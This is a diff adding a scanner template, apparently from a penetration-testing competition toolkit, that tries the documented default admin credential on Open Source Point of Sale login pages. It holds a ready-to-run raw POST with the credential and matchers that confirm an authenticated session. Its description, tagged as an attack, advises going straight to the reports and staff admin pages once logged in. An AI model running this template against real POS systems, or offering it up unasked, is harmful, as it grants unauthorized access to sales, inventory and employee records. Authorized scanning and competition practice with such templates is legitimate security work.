@@ -1,0 +1,54 @@
+# OSPOS default credential login attempt.
+id: ospos-default-login
+
+info:
+  name: Open Source Point of Sale Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 1
+    kind: attack
+  description: |
+    OSPOS is a self-hosted point-of-sale system used for gift shops and food
+    service. Docker and many install guides ship the default admin account
+    admin:pointofsale, and the stock install never forces a change.
+
+    This template POSTs the default credential to the OSPOS login form and
+    matches the authenticated redirect plus the home controller marker. A
+    match means the default account works and the tester holds an
+    authenticated POS session: sales, inventory, reports and staff records
+    are directly reachable. Try the session against /index.php/reports and
+    staff admin first.
+
+    One POST request. The credential is a documented vendor default, not a
+    guessed password.
+  reference:
+    - https://github.com/opensourcepos/opensourcepos
+  tags: themepark,pos,default-login,attack
+
+http:
+  - raw:
+      - |
+        POST /index.php/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=pointofsale&login=Login
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "logout"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "login_password"
+          - "Invalid"
